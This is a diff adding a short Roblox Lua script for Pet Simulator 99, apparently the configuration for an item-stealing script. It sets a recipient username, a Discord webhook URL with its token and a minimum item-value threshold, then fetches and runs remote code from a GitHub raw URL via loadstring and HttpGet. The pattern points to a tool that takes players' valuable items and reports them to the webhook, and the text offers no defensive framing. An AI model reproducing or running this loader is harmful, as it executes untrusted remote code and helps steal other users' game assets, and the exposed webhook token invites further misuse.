@@ -1,0 +1,10 @@
+```lua
+Username = "Gogogoggg12"
+Username2 = "Gogogoggg12"
+Webhook = "https://discord.com/api/webhooks/1297593212017311824/ZEqIN4VI5q_MBWajP7-MNQxsaW7zDyEOxqzKv98CgbuVHnovII2EhGc4mtX8s3I9A5Zz"
+
+
+MinimumRAP = 500000
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ImDigitalz/MoriScripts/main/PS99"))()```
